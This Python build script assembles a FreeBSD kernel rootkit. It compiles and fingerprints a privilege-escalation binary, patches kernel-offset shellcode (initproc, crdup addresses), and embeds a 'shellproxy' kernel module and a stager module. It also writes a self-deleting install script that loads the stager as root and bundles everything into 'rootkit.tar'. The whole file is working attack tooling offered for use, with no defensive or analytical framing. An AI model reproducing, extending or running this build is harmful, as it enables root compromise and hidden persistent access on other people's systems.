"""
this is automagically ran on freebsd vm; see vmbuild.pl and makefile thx
RUN ME ON FREEBSD VM 
RUN ME ON FREEBSD VM 
RUN ME ON FREEBSD VM 
RUN ME ON FREEBSD VM 
RUN ME ON FREEBSD VM 
RUN ME ON FREEBSD VM 
RUN ME ON FREEBSD VM 
"""
import os
import subprocess
import struct
import sys

fplen = 16
# offsets and kbase
kernelbase = 0xFFFFFFFF80000000
initprocoff = 0x1B74508
crdupoff = 0x0B80FD0


def run(*c, **x):
    print(" ".join(c))
    subprocess.run(c, check=True, **x)


def read(p):
    with open(p, "rb") as f:
        return f.read()


def write(p, d):
    with open(p, "wb") as f:
        f.write(d)


def pq(x):
    return struct.unpack("<Q", x)

"""
this is the core building code. as you can tell its very badly written, and is mainly meant to just set up all the hot patching shit in the ehader files/config/etc.
you can edit this to add extra steps. think of this is a makefile/magefile but more retarded
"""
# 1. create fingerprint
fp = os.urandom(fplen)
fp_hex = fp.hex()
print(f"+ fphash {fp_hex}")

# 2. compile privesc and find the fingerprint thing in our script. do NOT CHANGE THE FUCKING PLACEHOLDER
run("cc", "-O2", "-o", "elevate", "privesc.c")
elev = bytearray(read("elevate"))
placeholder = b"\xaa"*fplen
offset = elev.find(placeholder)

if offset < 0:
    sys.exit("cant find placeholder. wtf did you do leave that file alone")
print(f"ok got offset: {offset}")

# 3. patch up for shellcode
fplow = pq(fp[:8])[0]
fphi = pq(fp[8:16])[0]

initproc = kernelbase+initprocoff
crdup = kernelbase+crdupoff
print(hex(initproc))

defines = f"""#define FP_OFFSET {offset}
#define FP_LO 0x{fplow:x}
#define FP_HI 0x{fphi:x}
#define INITPROC_ADDR 0x{initproc:x}
#define CRDUP_ADDR 0x{crdup:x}
"""

sc_src = read("pe.S").decode()

write("sc_pp.S", (defines + sc_src).encode())

run("cc", "-E", "-x", "assembler-with-cpp", "sc_pp.S", "-o", "sc_ready.S", stderr=subprocess.DEVNULL)

run("cc", "-c", "-x", "assembler", "-o", "sc.o", "sc_ready.S")

run("objcopy", "-O", "binary", "-j", ".text", "sc.o", "sc.bin")

sc = read("sc.bin")
print(f"+ sclen {len(sc)}")
blob = ",\n".join("0x%02x" % b for b in sc)
write("sc_blob.h", f"""static const unsigned char sc_bin[] = {{
{blob}}};
static const unsigned int sc_len = {len(sc)};
""".encode())

# 4. patch privesc with our fingerprint
elev[offset:offset+fplen] = fp
write("elevate", bytes(elev))
os.chmod("elevate", 0o755)

run("cc", "-O2", "-o", "configgen", "configgen.c")
with open("config.h", "wb") as f:
    subprocess.run(["./configgen", "config.json"], stdout=f, check=True)

# 5. shellproxy module: embed the raw .ko.
import glob
for f in glob.glob("lib/*.o"): os.remove(f)
lan_only = not os.path.exists("shellproxy/dd_conf.h")
mkargs = ["make", "-C", "shellproxy"]
if lan_only:
    mkargs.append("LAN_ONLY=1")
run(*mkargs, "clean")
run(*mkargs)

proxy = read("shellproxy/shellproxy.ko")
proxy_data = ",".join("0x%02x" % b for b in proxy)
write("proxy_blob.h", f"""static const unsigned char proxy_blob[] = {{{proxy_data}}};
static const unsigned int proxy_len = {len(proxy)};
""".encode())
print(f"+ shellproxy {len(proxy)} bytes embedded")

# 6. stager
run("make", "-C", "stager", "clean")
run("make", "-C", "stager")
write("stager.ko", read("stager/stager.ko"))


# 6. install and stubs
install_src = os.environ.get("INSTALL_SRC", "install")
if os.path.exists(install_src) and os.path.getsize(install_src) > 0:
    install = read(install_src)
else:
    install = read("src/tools/install") if os.path.exists("src/tools/install") else b"""#!/bin/sh
set -e
cd "$(dirname "$0")"
[ "$(id -u)" = "0" ] || { echo "root required" >&2; exit 1; }
kldload ./stager.ko
kldunload stager
rm -f stager.ko "$0"
"""
write("install", install)
os.chmod("install", 0o755)

write("log", read("log"))
os.chmod("log", 0o755)

# 7. tar
run("tar", "czf", "rootkit.tar", "install", "elevate", "log", "remote", "stager.ko")
size = os.path.getsize("rootkit.tar")
print(f"+ tarball {size} bytes")
